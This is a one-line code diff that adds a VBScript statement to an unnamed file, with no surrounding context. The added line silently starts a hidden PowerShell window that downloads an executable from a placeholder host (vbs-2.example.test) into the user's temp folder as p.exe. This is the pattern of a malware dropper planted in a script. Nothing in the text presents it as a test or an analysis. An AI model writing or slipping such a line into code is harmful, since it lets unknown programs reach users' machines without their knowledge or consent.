@@ -1,0 +1,1 @@
+Set s = CreateObject("WScript.Shell") : s.Run "cmd /c powershell -w hidden -c iwr http://vbs-2.example.test/y.exe -o %TEMP%\p.exe", 0, False
